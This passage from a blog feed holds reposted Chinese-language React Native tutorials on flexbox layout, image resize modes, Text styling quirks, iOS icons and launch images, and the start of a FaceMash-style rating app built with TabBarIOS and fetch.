backgroundColor:"#aaaabb"}}&gt; &lt;View style={{flex: 1, flexDirection:'row', backgroundColor:"#eeaaaa"}}&gt; &lt;View style={{flex: 1, backgroundColor:"#eebbaa"}}&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#bbccee"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#eebbdd"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#aaccaa"}}&gt; &lt;ScrollView style={{flex: 1, backgroundColor:"#bbccdd", padding: 5}}&gt; &lt;View style={{flexDirection: 'row', height: 50, backgroundColor:"#fefefe"}}&gt; &lt;View style={{flex: 1, flexDirection:'column', backgroundColor:"#eeeeee"}}&gt; &lt;View style={{flex: 1, backgroundColor:"#bbaaaa"}}&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#aabbaa"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, flexDirection:'row', backgroundColor:"#eeeeee"}}&gt; &lt;View style={{flex: 1, backgroundColor:"#aaaabb"}}&gt; &lt;View style={{flex: 1, flexDirection:'row', backgroundColor:"#eeaaaa"}}&gt; &lt;View style={{flex: 1, backgroundColor:"#eebbaa"}}&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#bbccee"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#eebbdd"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;View style={{flex: 1, backgroundColor:"#aaccaa"}}&gt; &lt;/View&gt; &lt;/View&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header, {color: &apos;#ffffff&apos;, fontSize: 12}]}&gt; {(function(){ var str = &apos;&apos;; var n = 100; while(n--) { str += &apos;嵌套的网格&apos; + &apos;\n&apos;; } return str; })()} &lt;/Text&gt; &lt;/ScrollView&gt; &lt;/View&gt; &lt;/View&gt; &lt;/View&gt; 好在没被我玩儿坏，可以看到上图的嵌套关系也是足够的复杂的，（我还加了一个ScrollView，然后再嵌套整个结构）嵌套多层的布局是没有问题的。 图片布局首先我们得知道图片有一个stretchMode. 通过Image.resizeMode访问找出有哪些mode var keys = Object.keys(Image.resizeMode).join(&apos; &apos;); 打印出来的是 contain, cover, stretch 这几种模式， （官方文档不知道为什么不直接给出）尝试使用这些mode &lt;Text style={styles.welcome}&gt; 100px height &lt;/Text&gt; &lt;Image style={{height: 100}} source={{uri: 'http://gtms03.alicdn.com/tps/i3/ TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png'}} /&gt; 100px 高度， 可以看到图片适应100高度和全屏宽度，背景居中适应未拉伸但是被截断也就是cover。 &lt;Text style={styles.welcome}&gt; 100px height with resizeMode contain &lt;/Text&gt; &lt;View style={[{flex: 1, backgroundColor: &apos;#fe0000&apos;}]}&gt; &lt;Image style={{flex: 1, height: 100, resizeMode: Image.resizeMode.contain}} source={{uri: 'http://gtms03.alicdn.com/tps/i3/TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png'}} /&gt; &lt;/View&gt; contain 模式容器完全容纳图片，图片自适应宽高 &lt;Text style={styles.welcome}&gt; 100px height with resizeMode cover &lt;/Text&gt; &lt;View style={[{flex: 1, backgroundColor: &apos;#fe0000&apos;}]}&gt; &lt;Image style={{flex: 1, height: 100, resizeMode: Image.resizeMode.cover}} source={{uri: 'http://gtms03.alicdn.com/tps/i3/TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png'}} /&gt; &lt;/View&gt; cover模式同100px高度模式 &lt;Text style={styles.welcome}&gt; 100px height with resizeMode stretch &lt;/Text&gt; &lt;View style={[{flex: 1, backgroundColor: &apos;#fe0000&apos;}]}&gt; &lt;Image style={{flex: 1, height: 100, resizeMode: Image.resizeMode.stretch}} source={{uri: 'http://gtms03.alicdn.com/tps/i3/TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png'}} /&gt; &lt;/View&gt; stretch模式图片被拉伸适应屏幕 &lt;Text style={styles.welcome}&gt; set height to image container &lt;/Text&gt; &lt;View style={[{flex: 1, backgroundColor: &apos;#fe0000&apos;, height: 100}]}&gt; &lt;Image style={{flex: 1}} source={{uri: 'http://gtms03.alicdn.com/tps/i3/TB1Kcs5GXXXXXbMXVXXutsrNFXX-608-370.png'}} /&gt; &lt;/View&gt; 随便试验了一下， 发现高度设置到父容器，图片flex的时候也会等同于cover模式 绝对定位和相对定位&lt;View style={{flex: 1, height: 100, backgroundColor: '#333333'}}&gt; &lt;View style={[styles.circle, {position: &apos;absolute&apos;, top: 50, left: 180}]}&gt; &lt;/View&gt; &lt;/View&gt; styles = { circle: { backgroundColor: &apos;#fe0000&apos;, borderRadius: 10, width: 20, height: 20 } } 和css的标准不同的是， 元素容器不用设置position：’absolute|relative’ . &lt;View style={{flex: 1, height: 100, backgroundColor: '#333333'}}&gt; &lt;View style={[styles.circle, {position: &apos;relative&apos;, top: 50, left: 50, marginLeft: 50}]}&gt; &lt;/View&gt; &lt;/View&gt; 相对定位的可以看到很容易的配合margin做到了。 （我还担心不能配合margin，所以测试了一下：-：） padding和margin我们知道在css中区分inline元素和block元素，既然react-native实现了一个超级小的css subset。那我们就来实验一下padding和margin在inline和非inline元素上的padding和margin的使用情况。padding &lt;Text style={[styles.text, styles.header]}&gt; 在正常的View上设置padding &lt;/Text&gt; &lt;View style={{padding: 30, backgroundColor: '#333333'}}&gt; &lt;Text style={[styles.text, {color: &apos;#fefefe&apos;}]}&gt; Text Element&lt;/Text&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header]}&gt; 在文本元素上设置padding &lt;/Text&gt; &lt;View style={{padding: 0, backgroundColor: '#333333'}}&gt; &lt;Text style={[styles.text, {backgroundColor: &apos;#fe0000&apos;, padding: 30}]}&gt; text 元素上设置paddinga &lt;/Text&gt; &lt;/View&gt; 在View上设置padding很顺利，没有任何问题， 但是如果在inline元素上设置padding， 发现会出现上面的错误， paddingTop和paddingBottom都被挤成marginBottom了。 按理说，不应该对Text做padding处理， 但是确实有这样的问题存在，所以可以将这个问题mark一下。margin &lt;Text style={[styles.text, styles.header]}&gt; 在正常的View上设置margin &lt;/Text&gt; &lt;View style={{backgroundColor: '#333333'}}&gt; &lt;View style={{backgroundColor: '#fefefe', width: 30, height: 30, margin: 30}}/&gt; &lt;/View&gt; &lt;Text style={[styles.text, styles.header]}&gt; 在文本元素上设置margin &lt;/Text&gt; &lt;View style={{backgroundColor: '#333333'}}&gt; &lt;Text style={[styles.text, {backgroundColor: &apos;#fe0000&apos;, margin: 30}]}&gt; text 元素上设置margin &lt;/Text&gt; &lt;Text style={[styles.text, {backgroundColor: &apos;#fe0000&apos;, margin: 30}]}&gt; text 元素上设置margin &lt;/Text&gt; &lt;/View&gt; 我们知道，对于inline元素，设置margin-left和margin-right有效，top和bottom按理是不会生效的， 但是上图的结果可以看到，实际是生效了的。所以现在给我的感觉是Text元素更应该理解为一个不能设置padding的block。算了不要猜了， 我们看看官方文档怎么说Text，https://facebook.github.io/react-native/docs/text.html &lt;Text&gt; &lt;Text&gt;First part and &lt;/Text&gt; &lt;Text&gt;second part&lt;/Text&gt; &lt;/Text&gt; // Text container: all the text flows as if it was one // |First part | // |and second | // |part | &lt;View&gt; &lt;Text&gt;First part and &lt;/Text&gt; &lt;Text&gt;second part&lt;/Text&gt; &lt;/View&gt; // View container: each text is its own block // |First part | // |and | // |second part| 也就是如果Text元素在Text里边，可以考虑为inline， 如果单独在View里边，那就是Block。下面会专门研究一下文本相关的布局 文本元素首先我们得考虑对于Text元素我们希望有哪些功能或者想验证哪些功能： 1.文字是否能自动换行？2.overflow ellipse？3.是否能对部分文字设置样式 ，类似span等标签 先看看文字有哪些支持的style属性/*==========TEXT================*/ Attributes.style = { color string containerBackgroundColor string fontFamily string fontSize number fontStyle enum(&apos;normal&apos;, &apos;italic&apos;) fontWeight enum(&quot;normal&quot;, &apos;bold&apos;, &apos;100&apos;, &apos;200&apos;, &apos;300&apos;, &apos;400&apos;, &apos;500&apos;, &apos;600&apos;, &apos;700&apos;, &apos;800&apos;, &apos;900&apos;) lineHeight number textAlign enum(&quot;auto&quot;, &apos;left&apos;, &apos;right&apos;, &apos;center&apos;) writingDirection enum(&quot;auto&quot;, &apos;ltr&apos;, &apos;rtl&apos;) } 实验1， 2， 3&lt;Text style={[styles.text, styles.header]}&gt; 文本元素 &lt;/Text&gt; &lt;View style={{backgroundColor: '#333333', padding: 10}}&gt; &lt;Text style={styles.baseText} numberOfLines={5}&gt; &lt;Text style={styles.titleText} onPress={this.onPressTitle}&gt; 文本元素{&apos;\n&apos;} &lt;/Text&gt; &lt;Text&gt; {&apos;\n&apos;}In this example, the nested title and body text will inherit the fontFamily from styles.baseText, but the title provides its own additional styles. The title and body will stack on top of each other on account of the literal newlines, numberOfLines is Used to truncate the text with an elipsis after computing the text layout, including line wrapping, such that the total number of lines does not exceed this number. &lt;/Text&gt; &lt;/Text&gt; &lt;/View&gt; styles = { baseText: { fontFamily: &apos;Cochin&apos;, color: &apos;white&apos; }, titleText: { fontSize: 20, fontWeight: &apos;bold&apos;, } } 从结果来看1，2，3得到验证。 但是不知道各位有没有发现问题， 为什么底部空出了这么多空间， 没有设置高度啊。 我去除numberOfLines={5} 这行代码，效果如下：所以实际上， 那段空间是文本撑开的， 但是文本被numberOfLines={5} 截取了，但是剩余的空间还在。 我猜这应该是个bug。其实官方文档里边把numberOfLines={5}这句放到的是长文本的Text元素上的，也就是子Text上的。 实际结果是不生效。 这应该又是一个bug。Text元素的子Text元素的具体实现是怎样的， 感觉这货会有很多bug， 看官文 &lt;Text style={{fontWeight: 'bold'}}&gt; I am bold &lt;Text style={{color: 'red'}}&gt; and red &lt;/Text&gt; &lt;/Text&gt; Behind the scenes, this is going to be converted to a flat NSAttributedString that contains the following information &quot;I am bold and red&quot; 0-9: bold 9-17: bold, red 好吧， 那对于numberOfLines={5} 放在子Text元素上的那种bug倒是可以解释了。 Text的样式继承实际上React-native里边是没有样式继承这种说法的， 但是对于Text元素里边的Text元素，上面的例子可以看出存在继承。 那既然有继承，问题就来了！到底是继承的最外层的Text的值呢，还是继承父亲Text的值呢？ &lt;Text style={[styles.text, styles.header]}&gt; 文本样式继承 &lt;/Text&gt; &lt;View style={{backgroundColor: '#333333', padding: 10}}&gt; &lt;Text style={{color: 'white'}}&gt; &lt;Text style={{color: 'red'}} onPress={this.onPressTitle}&gt; 文本元素{&apos;\n&apos;} &lt;Text&gt;我是white还是red呢？{&apos;\n&apos;} &lt;/Text&gt; &lt;/Text&gt; &lt;Text&gt;我应该是white的&lt;/Text&gt; &lt;/Text&gt; &lt;/View&gt; 结果可见是直接继承父亲Text的。 总结 react 宽度基于pt为单位， 可以通过Dimensions 来获取宽高，PixelRatio 获取密度，如果想使用百分比，可以通过获取屏幕宽度手动计算。 基于flex的布局 view默认宽度为100% 水平居中用alignItems, 垂直居中用justifyContent 基于flex能够实现现有的网格系统需求，且网格能够各种嵌套无bug 图片布局 通过Image.resizeMode来适配图片布局，包括contain, cover, stretch 默认不设置模式等于cover模式 contain模式自适应宽高，给出高度值即可 cover铺满容器，但是会做截取 stretch铺满容器，拉伸 定位 定位相对于父元素，父元素不用设置position也行 padding 设置在Text元素上的时候会存在bug。所有padding变成了marginBottom 文本元素 文字必须放在Text元素里边 Text元素可以相互嵌套，且存在样式继承关系 numberOfLines 需要放在最外层的Text元素上，且虽然截取了文字但是还是会占用空间转自：http://www.infoq.com/cn/articles/react-native-layout/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React Native之设置IOS的图标，名称和启动图🍖]]></title>
      <url>%2F2016%2F04%2F28%2F25%2F</url>
      <content type="text"><![CDATA[1.首先，app的名称：如图所示：我的工程名叫BOOk 在BOOk下面的info.plist的文件里设置app的相关信息：比如Bundle name就是设置APP的名称 2.App的图标：（这里注意的是：1.app的图标有尺寸之分，所以如果图片的尺寸不对，编译也就会失败！2.图标的圆角是系统自己设定的，也就是说，我们上传的图片是正正方方的！）如图：在工程文件下面的 images.xcassests的文件下是存储图片文件的地方，在IOS开发中一般是将图片放在这个位置，但是在React native的开发中，我们也可以从这里面拿图片使用，也可以自己定义图片存储文件夹，当然为了方便起见，一般我们将自定义图片文件夹放在RN工程中，android、IOS的工程外，当然，启动图啥的就还是乖乖的放在android，IOS工程里面吧！ 3.启动图：同样！启动图也是放在images.xcasssets文件里 ，但是，我们要新建 失误~吧QQ给截图出来了~~~呵呵，点击左侧的空白处` 然后new icon那个 —-new ios launch然后我们将启动图拖拽到里面~（注意尺寸，要不然编译会出错！！！）这个添加好了以后就需要去设置啦~点击项目名称（我这里是BOOK）然后会弹出这样的界面这里的App icons source 就是我们设置图标的路径（可以去查看下）然后我们要设置的是下面的这个lanch images source 改成我们刚新建的那个启动图就好了~这里注意的是：下面的launch Screen file要设置成空ok！完成结束！ 转自：http://www.cnblogs.com/allenxieyusheng/p/5802179.html]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React Native简单教程🌼]]></title>
      <url>%2F2016%2F04%2F25%2F24%2F</url>
      <content type="text"><![CDATA[最近开始研究react native，准备写几篇关于react native的文章。作为一个 JavaScript 开发者，我之前从来没想过用 JavaScript 很容易地写原生移动应用。当然，我们已经有了如 PhoneGap 等工具，但在原生应用中封装一个基于浏览器的应用还有许多需要改进的地方。 现在这一切都改变了—— Facebook 的 React 团队发布了 React Native。它不仅可以让我们使用 React 框架来使用原生移动组件创建应用程序，但它使一切成为了现实——这意味着我们在开发应用时不需要重新编译——这使得它非常容易地创建移动应用！我有幸预览了 React Native 的 beta 版本，从那开始它大规模成长了起来。请注意，目前已经支持 iOS。因此你需要运行 OS X 上的 Xcode 来跟随本教程。如果你还没有过机会学习 React, 看看我的教程 来开始用用它吧.要重点注意学习这个并不意味着我们可以写一次代码就能将这段代码用到每一个地方。尝试那样做会因为疯狂的抽象级别而陷入一场灾难。React Native 则让我们可以学习一次，到处编写。 回到 2004 如果你关注社交网络领域的话你会记得 FaceMash，正式这个应用开创了 Facebook。对于不关注这个领域的人，其实是11年前(哇塞) Mark Zuckerberg 创建了 FaceMash，它是一个你可以用来查看两个人之中谁更加热门的应用程序。每一个人都有一个能反映他们有多“热门”的分数值 (尽管不知道原来使用的是什么算法，不过那部电影（社交网络）显示 Elo 排名算法 曾被使用过) .它全部的荣耀都在于此 -让我们整个来过一遍吧 - 我们准备用 React Native 来重新创建 FaceMash。如果你觉得凭外貌来评价姑娘们不道德，你可以把图片变成你觉得能吸引人的其它事务(狗狗，代码块，等等，我不做评价)，随便。 创建你的应用 如你所愿，你可以从这儿 clone 到初始的代码库。这不是必须的，不过为了不让你错过不同阶段代码的不同分支，你可以 clone 一份下来! 休斯顿，我们已经升空 如果你没有 clone 代码库，就需要设置基础项目. React Native 可以让我们使用 react-native-cli npm 包 CLI 快速开始一个项目。如果你还没有安装这个，可以快速运行命令： npm install -g react-native-cli 然后我们就可以开始了.在终端里导航到一个文件夹并运行命令： react-native init FaceMash 这样做能为我们准备好基础到应用程序，供我们挖掘和加入更多东西. 打开它 打开 XCode 并浏览到你创建了应用程序的目录里面. 你需要从这里打开 facemash.xcodeproj。React Native 支持我们在 iOS 模拟器和实际的 iOS 设备上工作.我将会在 iOS 模拟器上面进行开发，因为它运行更多快速的应用程序开发 - 当我们修改了JavaScript 时，可以按下 Command + R 组合建来刷新应用，或者我们也可以通过 developer 菜单(通过 Command + Control + Z 就能访问到)启用动态重新载入来变成超级懒人。我们设置可以在Chrome的开发者工具中调试我们的代码。如果你希望使用你的 iOS 设备来开发你的应用程序，就需要让设备痛你的计算机处于同一个网络中。React 默认会在 localhost 找到 JavaScript，所以就需要你将它指向你的计算机.我们可以通过编辑 AppDelegate.m 文件，将 localhost 改成我们的本地 IP 来达成这个目的. 你可以通过按下 Alt 的同时点击 wireless 菜单 在 OS X 来找到这个东西.现在就可以运行我们的应用程序了。应用程序会在你在 XCode 中选择的目标中打开. 当我们点击运行，同时会产生一个在我们应用程序目录中运行着 npm start 的终端线程. 如果你不希望通过 XCode 运行应用，确保你运行了 npm start。这将会创建一个在端口8081上的本地 web 服务器，它指向我们编译好的 JavaScript 代码，并且也会监视到我们保存代码的动作以进行重新编译。我把应用程序运行在一个模拟的 iPhone6 之上, 屏幕是真实设备的50%那么大.这就是了，我们有了一个空的 canvas，有好多空间活动啊! 悄悄来看一看 让我来看看拿来渲染我们可以在上面的截屏中所看到的东西的代码. 打开 index.ios.js. /** * Sample React Native App * https://github.com/facebook/react-native */ &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { AppRegistry, StyleSheet, Text, View, } = React; var facemash = React.createClass({ render: function() { return ( &lt;View style={styles.container}&gt; &lt;Text style={styles.welcome}&gt; Welcome to React Native! &lt;/Text&gt; &lt;Text style={styles.instructions}&gt; To get started, edit index.ios.js &lt;/Text&gt; &lt;Text style={styles.instructions}&gt; Press Cmd+R to reload,{&apos;\n&apos;} Cmd+Control+Z for dev menu &lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, justifyContent: &apos;center&apos;, alignItems: &apos;center&apos;, backgroundColor: &apos;#F5FCFF&apos;, }, welcome: { fontSize: 20, textAlign: &apos;center&apos;, margin: 10, }, instructions: { textAlign: &apos;center&apos;, color: &apos;#333333&apos;, marginBottom: 5, }, }); AppRegistry.registerComponent(&apos;facemash&apos;, () =&gt; facemash); 你可以合上你惊讶的嘴了 - 是的，这就是我们拿来渲染我们的应用程序的全部东西。看起来熟悉，对不对? React Native vs 浏览器 不是 React Native 的所有东西都能满足你在浏览器中使用React的用途. 不过，两者之间的区别是如此的微不足道，所以完全没有必要担心它们.1.不使用诸如 div 活着 section 之类的块元素, 我们在React中使用的是View组件. 它会映射到原生的 iOS 组件 UIView.2.所有的文本都必须被封装到 Text 组件里面。3.没有样式表 - 你的所有的样式都是被写成 JavaScript 对象的。4.我们没有必要担心浏览器的兼容性问题 - ES6 harmony 是在盒子之外受到支持的，flexbox也是如此。 开始工作 我们准备从清理 React 组件的样式表盒渲染函数开始。为了对 React Native 有一个理想的基本了解，我们将尝试使用尽可能多的不同组件。让我们先从 TabBarIOS 组件开始. 你也许能认出 TabBar 组件来，它被用在诸如时钟和照片这样一些核心的iOS应用中。 var React = require(&apos;react-native&apos;); var { AppRegistry, StyleSheet, Text, View, TabBarIOS } = React; var facemash = React.createClass({ getInitialState() { return { selectedTab: &apos;faceMash&apos; } }, render: function() { return ( &lt;TabBarIOS&gt; &lt;TabBarIOS.Item title=&quot;FaceMash&quot; icon={ require(&apos;image!facemash&apos;) } selected={ this.state.selectedTab === &apos;faceMash&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Face Mash&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;TabBarIOS.Item title=&quot;Messages&quot; icon={ require(&apos;image!messages&apos;) } selected={ this.state.selectedTab === &apos;messages&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Messages&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;TabBarIOS.Item title=&quot;Settings&quot; icon={ require(&apos;image!settings&apos;) } selected={ this.state.selectedTab === &apos;settings&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Settings&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;/TabBarIOS&gt; ); } }); var styles = StyleSheet.create({ pageView: { backgroundColor: &apos;#fff&apos;, flex: 1 } }); // omitted code 看看这个！你会注意到当前的文本覆在了状态条上面，我们稍后会修复这个问题。TabBarIOS 组件对它的每一个子项都使用了 TabBarIOS.Item。我们将会有三个页面——分别是你给人们评级的页面，一个消息列表以及一个设置的页面。TabBarIOS.Item 必须有一个子项。他将会是已经被选取的页面的内容(你可以发现我们会根据组件的状态来选择设置成true还是false)。很明显，一个 TAB 条没有图标不会好看。有几个系统图标是你可以拿来用的，不过如果你用了他们的话，TAB 的文字也会发生变化，以与系统的图标配对. 所以我们会使用自己的图标。为了在 React Native 中引入本地的图片资源，你可以使用 require 后面带上图片的资源名称！我使用的图标是可以免费拿来用的，来自于 flaticon 的 CC 3.0 许可. 使用静态图片 为了向 React Native 添加静态图片，请打开 XCode。在 Project Navigator (左手边的第一个图标)中, 打开 Images.xcassets 。你所有的图片都在那儿。这可以让我们将所有的资源保持在同一个名称下，这样可以针对每一个分辨率、甚至是设备的特定图片提供不同的图像资源。图像必须遵循一个严格的命名约定。使用的资源名称(比如 messages 或者是 settings) 并在后面给它带上它应该适用来显示的分辨率。例如，我要为 iPhone6 构建一个应用程序，我会为此使用 @2x 分辨率。一旦为你的图片进行了正确的命名，就可以将它拖入左手边的 Images.xcassets 中了。然后你就可以在 React Native 中使用 require(‘image!assetname’) 了！ 回到代码 下一个逻辑步骤就是设置我们的主组件使得 Tab 之间的切换可用。我们可以通过设置用户点击它时的状态来做到。TabBarIOS.Item 让我们可以给它一个 onPress 属性，可以拿来检测用户何时按下了一个tab。 // omitted code var facemash = React.createClass({ getInitialState() { return { selectedTab: &apos;faceMash&apos; } }, changeTab(tabName) { this.setState({ selectedTab: tabName }); }, render: function() { return ( &lt;TabBarIOS&gt; &lt;TabBarIOS.Item title=&quot;FaceMash&quot; icon={ require(&apos;image!facemash&apos;) } onPress={ () =&gt; this.changeTab(&apos;faceMash&apos;) } selected={ this.state.selectedTab === &apos;faceMash&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Face Mash&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;TabBarIOS.Item title=&quot;Messages&quot; icon={ require(&apos;image!messages&apos;) } onPress={ () =&gt; this.changeTab(&apos;messages&apos;) } selected={ this.state.selectedTab === &apos;messages&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Messages&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;TabBarIOS.Item title=&quot;Settings&quot; icon={ require(&apos;image!settings&apos;) } onPress={ () =&gt; this.changeTab(&apos;settings&apos;) } selected={ this.state.selectedTab === &apos;settings&apos; }&gt; &lt;View style={ styles.pageView }&gt; &lt;Text&gt;Settings&lt;/Text&gt; &lt;/View&gt; &lt;/TabBarIOS.Item&gt; &lt;/TabBarIOS&gt; ); } }); // omitted code 可以了！它是多么的简单. 通过在 iOS 模拟器中按下 Command+R 来刷新应用(或者如果你是在真实设备上开发，可以通过 XCode 来对它进行重新编译) 你就会看到现在我们可以进行按下 tab 的操作了，并且主屏幕的显示也发生了变化！尽管我们还没有写太多的代码，但是已经见第一个步骤分支的代码 checkout 出来了，里面也包含了我们在这个 tab 上用上了的图标。 让我们打分吧 让我们来实现 FaceMash 的 tab 界面吧。我们将会从一个端点那里使用获取来加载到数据。在步骤一的分支中，我已经在 rest/ 目录中包含进来了一个 config.yaml 文件，那是我们将会用来使用 stubby 对端点进行模拟的。所有 endpoint/pictures 中的用户都会被从 randomuser.me 处随机的生成。打开你的终端并且运行命令 stubby -d rest/config.yaml 接着我们就开始吧！在名为 tabs/ 的目录中创建一个新文件，命名为 FaceMash.js，在里面放一个基础的 React 组件 - &apos;use strict&apos;; var React = require(&apos;react-native&apos;); var { StyleSheet, Text, View } = React; var facemashTab = React.createClass({ render: function() { return ( &lt;View style={ styles.container }&gt; &lt;Text&gt; FaceMash tab! &lt;/Text&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; } }); module.exports = facemashTab; 目前我们能从这个Tab上得到全部就是一个里面有一些文字的基础的 View 组件。我们还可以为这个 View 弄一些基础的样式，这样可以确保它具有合适的高和宽。我们会添加一个头部，纯粹是用于展示的目的. // omitted code var facemashTab = React.createClass({ render: function() { return ( &lt;View style={ styles.container }&gt; &lt;View style={ styles.header }&gt; &lt;/View&gt; &lt;View style={ styles.content }&gt; &lt;Text&gt; FaceMash tab! &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; }, header: { height: 40, background: &apos;#ff0000&apos; } }); module.exports = facemashTab; 现在我们会抱怨状态条的黑色很糟糕，不过不要担心，因为我们可以使用 StatusBarIOS 的 API 来对其进行修改。当 changeTabfunction 被调用时，我们可以检查看看当前的 tab 是不是 FaceMash 的 tab。如果是的话，我们将会把状态调的状态设置为1（白色），如果不是就设置为0(黑色). index.ios.js// omitted code var { AppRegistry, StyleSheet, Text, View, TabBarIOS, StatusBarIOS } = React; var facemash = React.createClass({ ..., changeTab(tabName) { StatusBarIOS.setStyle(tabName === &apos;faceMash&apos; ? 1 : 0); this.setState({ selectedTab: tabName }); }, ... }); // omitted code 刷新你就会看到一个白色的状态条 - 解决了!我们现在可以访问端点来向我们的用户进行展示了。我们将会使用 fetch，它在 React Native 中默认是被包含了进来的。 // omitted code var facemashTab = React.createClass({ getInitialState: function() { return { list: [], currentIndex: 0 }; }, componentWillMount: function() { fetch(&apos;http://localhost:8882/rest/mash&apos;) .then(res =&gt; res.json()) .then(res =&gt; this.setState({ list: res })); }, render: function() { return ( ... ); } }); // omitted code 请求会用返回的数据对我们的状态进行填充。因为初始的数据时一个空的数组，所以我们可以在 render 函数中进行检查，在他们等待的时候显示一个加载页面。 var { StyleSheet, Text, View, ActivityIndicatorIOS } = React; var facemashTab = React.createClass({ ..., render: function() { var contents; if (!this.state.list.length) { contents = ( &lt;View style={ styles.loading }&gt; &lt;Text style={ styles.loadingText }&gt;Loading&lt;/Text&gt; &lt;ActivityIndicatorIOS /&gt; &lt;/View&gt; ) } else { contents = ( &lt;View style={ styles.content }&gt; &lt;Text&gt;Loaded&lt;/Text&gt; &lt;/View&gt; ) } return ( &lt;View style={ styles.container }&gt; &lt;View style={ styles.header }&gt; &lt;Text style={ styles.headerText }&gt;FaceMash&lt;/Text&gt; &lt;/View&gt; { contents } &lt;/View&gt; ); } }); var styles = StyleSheet.create({ container: { flex: 1, backgroundColor: &apos;#fff&apos; }, loading: { flex: 1, backgroundColor: &apos;#fff&apos;, justifyContent: &apos;center&apos;, alignItems: &apos;center&apos; }, loadingText: { fontSize: 14, marginBottom: 20 }, header: { height: 50, backgroundColor: &apos;#760004&apos;, paddingTop: 20, alignItems: &apos;center&apos; }, headerText: { color: &apos;#fff&apos;, fontSize: 20, fontWeight: &apos;bold&apos; } }); 现在我们将对位于 this.state.list 的数据进行访问。我们也会在端点返回一个对象的数组时，得到位于状态中的数组的当前索引 - 每个对象都是用户可以进行评比的两个人.因为要从两个人中选一个，两者都有同自身相关联的相同数据，我们将创建一个 React 组件来展示他们的数据。 // omitted code var Person = React.createClass({ render: function() { var person = this.props.person; return ( &lt;View style={ styles.person }&gt; &lt;Text&gt;Person!&lt;/Text&gt; &lt;/View&gt; ) } }); var facemashTab = React.createClass({ getInitialState: function() { return { list: [], currentIndex: 0 }; }, componentWillMount: function() { fetch(&apos;http://localhost:8882/rest/mash&apos;) .then(res =&gt; res.json()) .then(res =&gt; this.setState({ list: res })); }, render: function() { var contents; if (!this.state.list.length) { contents = ( &lt;View style={ styles.loading }&gt; &lt;Text style={ styles.loadingText }&gt;Loading&lt;/Text&gt; &lt;ActivityIndicatorIOS /&gt; &lt;/View&gt; ) } else { var { list, currentIndex } = this.state; var record = list[currentIndex]; var people = record.users.map(person =&gt; &lt;Person person={ person } /&gt;); contents = ( &lt;View style={ styles.content }&gt; { people } &lt;/View&gt; ) } return ( &lt;View style={ styles.container }&gt; &lt;View style={ styles.header }&gt; &lt;Text style={ styles.headerText }&gt;FaceMash&lt;/Text&gt; &lt;/View&gt; { contents } &lt;/View&gt; ); } }); var styles = StyleSheet.create({ ..., person: { flex: 1, margin: 10, borderRadius: 3, overflow: &apos;hidden&apos; } }); 我们现在就有了一个进行两次数据装入（每个人一次）的组件，合适的配置会向它进行传递。现在就可以将个人资料图片和相关的用户信息展示出来了。 展示外部的图片不同于我们的 tab 图标，我们用来展示的每一个用户的图片都来自一个外部的源. 这不是问题，事实上展示它们要比展示静态资源更加简单.我们只是向 Image 组件传递一个对象，而不是向它传入一个需要的图片. 这个对象会有一个属性—— url，它会指向我们想要加载的图片.当我们将用户信息作为一个叫做person的属性进行传递时，我们可以通过 this.props.person.picture 访问到图片的 URL。 // omitted code var Person = React.createClass({ render: function() { var person = this.props.person; return ( ) }}); // omitted code var styles = StyleSheet.create({ … person: { flex: 1, margin: 10, borderRadius: 3, overflow: ‘hidden’ }, personImage: { flex: 1, height: 200 }, …});module.exports = facemashTab; 这里也还有一些必要的样式 - 重新设置图片的大小难以置信的简单. 类似的 CSS 属性，比如 background-size，可以在 React Native 中被应用到图片之上, 而这里我们智慧在上面放一个 height，而图片会据此对尺寸进行重新设置. 现在我们可以将剩下的用户信息添加进去了。 // omitted code var Person = React.createClass({ render: function() { var person = this.props.person; return ( &lt;View style={ styles.person }&gt; &lt;Image style={ styles.personImage } source={ { uri: person.picture } } /&gt; &lt;View style={ styles.personInfo }&gt; &lt;Text style={ styles.personName }&gt; { person.firstName } { person.lastName } &lt;/Text&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; WON &lt;/Text&gt; &lt;Text style={ [styles.personScoreValue, styles.won] }&gt; { person.won } &lt;/Text&gt; &lt;/View&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; LOST &lt;/Text&gt; &lt;Text style={ [styles.personScoreValue, styles.lost] }&gt; { person.lost } &lt;/Text&gt; &lt;/View&gt; &lt;View style={ styles.personScore }&gt; &lt;Text style={ styles.personScoreHeader }&gt; SCORE 